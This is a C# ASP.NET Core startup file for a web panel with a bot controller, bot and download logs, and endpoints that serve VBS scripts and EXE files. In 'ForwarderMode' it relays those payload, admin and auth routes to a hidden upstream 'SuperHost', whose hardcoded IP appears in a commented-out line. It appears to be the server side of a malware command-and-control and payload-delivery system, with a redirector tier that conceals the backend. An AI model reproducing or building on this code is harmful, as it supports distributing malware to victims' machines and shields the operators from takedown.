using System.Text;
using cp.Controllers;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.Extensions.FileProviders;
using model;

namespace cp;

public static class Program
{
    public static string SuperHost => System.Environment.GetEnvironmentVariable("SuperHost", EnvironmentVariableTarget.Machine)!;

    //public static string SuperHost => "185.247.141.76";
    
    public static bool IsSuperHost => !string.IsNullOrEmpty(SuperHost);

    public static async Task Main(string[] args)
    {
        await BackSvc.DoWork();

        var builder = WebApplication.CreateBuilder(args);
        
        builder.Services.AddSingleton<ServerService>();
        builder.Services.AddHostedService<BackSvc>();
        builder.Services.AddMemoryCache();
        builder.Services.AddSession(options =>
        {
            options.IdleTimeout = TimeSpan.FromDays(7);
            options.Cookie.IsEssential = true;
            options.Cookie.HttpOnly = true;
            options.Cookie.SecurePolicy = CookieSecurePolicy.None;
        });
        builder.Services.AddScoped<BotController>(); 
        builder.Services.AddScoped<StatsController>(); 
        builder.Services.AddControllersWithViews()
            .AddRazorPagesOptions(options =>
            {
                options.Conventions.AllowAnonymousToPage("/"); 
            });
        builder.Services.AddHttpContextAccessor();        
        builder.Services.AddAuthentication(options =>
            {
                options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;
            })
            .AddCookie(options =>
            {
                options.Cookie.Name = "UserAuthCookie";
                options.Cookie.HttpOnly = true;
                options.Cookie.SecurePolicy = CookieSecurePolicy.None; // Allow cookies over HTTP
                options.Cookie.SameSite = SameSiteMode.Lax; // Ensure compatibility with most browsers
                options.SlidingExpiration = true;
                options.ExpireTimeSpan = TimeSpan.FromDays(7);
                options.AccessDeniedPath = "/auth";
                options.LoginPath = "/auth";  
                options.LogoutPath = "/auth/logout";
            });
        builder.Services.AddAuthorization(options =>
        {
            options.AddPolicy("AllowFromIpRange", policy =>
                policy.RequireAssertion(context =>
                {
                    var httpContext = context.Resource as HttpContext;
                    if (httpContext == null)
                    {
                        return false;
                    }
                    var remoteIp = httpContext.Connection.RemoteIpAddress?.ToString();
                    bool isAuthenticated = httpContext.User.Identity?.IsAuthenticated ?? false;
                    bool isIpAllowed = BackSvc.IsIpAllowed(remoteIp); 
                    return isAuthenticated || isIpAllowed;
                }));
        });

        var app = builder.Build();
        
        app.UseDeveloperExceptionPage();

        FtpServe(app);
        DataServe(app);
        
        if (IsSuperHost)
        {
            ForwarderMode(app);
        }
        
        app.UseAuthentication();
        if (!IsSuperHost)
        {
            app.UseRouting();
            app.UseAuthorization();
            app.MapControllers();
        }
        app.Run();
    }

    public static void FtpServe(WebApplication app)
    {
        app.UseStaticFiles(new StaticFileOptions
        {
            FileProvider = new PhysicalFileProvider(ServerModelLoader.PublishedAdsDirStatic),
            RequestPath = "/ftp"
        });
    }

    public static void DataServe(WebApplication app)
    {
        var allIps = BackSvc.GetPublicIPv4Addresses();
        var rec = BackSvc.Map.FirstOrDefault(a => allIps.Contains(a.Value));
        if (string.IsNullOrEmpty(rec.Value))
            return;
        var path = System.IO.Path.Join(ServerModelLoader.RootDataStatic, rec.Value);
        app.UseStaticFiles(new StaticFileOptions
        {
            FileProvider = new PhysicalFileProvider(path),
            RequestPath = $"/data"
        });
    }


    private static void ForwarderMode(WebApplication app)
    {
        app.Map("/admin", async context => { await ForwardRequest(context); });
        app.Map("/upsert", async context => { await ForwardRequest(context); });
        app.Map("/update", async context => { await ForwardRequest(context); });
        
        app.Map("/auth", async context => { await ForwardRequest(context); });
        app.Map("/auth/logout", async context => { await ForwardRequest(context); });

// Place the most specific routes first
        app.Map("/{profile}/{random}/{target}/DnLog", async context => { await ForwardRequest(context); });
        app.Map("/{profile}/{random}/{target}/GetVbs", async context => { await ForwardRequest(context); });
        app.Map("/{profile}/GetVbsPhp", async context => { await ForwardRequest(context); });

// Place routes with a single parameter next
        app.Map("/upsert", async context => { await ForwardRequest(context); });
        app.Map("/update", async context => { await ForwardRequest(context); });
        app.Map("/stats/dayly", async context => { await ForwardRequest(context); });
        app.Map("/stats/botlog", async context => { await ForwardRequest(context); });
        app.Map("/stats/downloadlog", async context => { await ForwardRequest(context); });
        app.Map("/GetIcon", async context => { await ForwardRequest(context); });
        app.Map("/GetExe", async context => { await ForwardRequest(context); });
        app.Map("/GetExeMono", async context => { await ForwardRequest(context); });


// Finally, place the catch-all route
        app.Map("/", async context => { await ForwardRequest(context); });
    }


    private static async Task ForwardRequest(HttpContext context, string remoteUrl = "")
    {
        remoteUrl = $"http://{SuperHost}";
        var server = BackSvc.EvalServer(context.Request);

        using var client = new HttpClient();

        var path = context.Request.Path.ToString();
        
        var targetUrl = remoteUrl + $"{path}{context.Request.QueryString}";
  
        var requestMessage = new HttpRequestMessage
        {
            Method = new HttpMethod(context.Request.Method),
            RequestUri = new Uri(targetUrl)
        };

        // Copy the headers
        foreach (var header in context.Request.Headers)
        {
            if (!requestMessage.Headers.TryAddWithoutValidation(header.Key, (IEnumerable<string>)header.Value))
            {
                requestMessage.Content?.Headers.TryAddWithoutValidation(header.Key,
                    (IEnumerable<string>)header.Value);
            }
        }

        // Copy the content if it is a POST or PUT request
        if (context.Request.Method == HttpMethod.Post.Method || context.Request.Method == HttpMethod.Put.Method)
        {
            if (context.Request.HasFormContentType)
            {
                // Handle form data and file uploads
                var form = await context.Request.ReadFormAsync();
                var multipartContent = new MultipartFormDataContent();

                foreach (var field in form)
                {
                    foreach (var value in field.Value)
                    {
                        multipartContent.Add(new StringContent(value), field.Key);
                    }
                }

                foreach (var file in form.Files)
                {
                    var fileContent = new StreamContent(file.OpenReadStream());
                    fileContent.Headers.ContentType =
                        new System.Net.Http.Headers.MediaTypeHeaderValue(file.ContentType);
                    multipartContent.Add(fileContent, file.Name, file.FileName);
                }

                requestMessage.Content = multipartContent;
            }
            else if (context.Request.ContentType != null &&
                     context.Request.ContentType.StartsWith("application/json", StringComparison.OrdinalIgnoreCase))
            {
                // Handle JSON payload
                var jsonContent = await new StreamReader(context.Request.Body).ReadToEndAsync();
                requestMessage.Content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
            }
            else
            {
                // Handle other content types or forward the request body as is
                requestMessage.Content = new StreamContent(context.Request.Body);
            }
        }

        requestMessage.Headers.Add("HTTP_X_FORWARDED_FOR", context.Connection.RemoteIpAddress.ToString());
        requestMessage.Headers.Add("HTTP_X_SERVER", server);

        // Send the request to the remote server
        var responseMessage = await client.SendAsync(requestMessage);

        // Copy the status code
        context.Response.StatusCode = (int)responseMessage.StatusCode;

        // Copy the response headers
        foreach (var header in responseMessage.Headers)
        {
            context.Response.Headers[header.Key] = header.Value.ToArray();
        }

        foreach (var header in responseMessage.Content.Headers)
        {
            context.Response.Headers[header.Key] = header.Value.ToArray();
        }

        context.Response.Headers.Remove("transfer-encoding"); // Remove the transfer-encoding header if it exists

        // Copy the response content
        await responseMessage.Content.CopyToAsync(context.Response.Body);
    }
}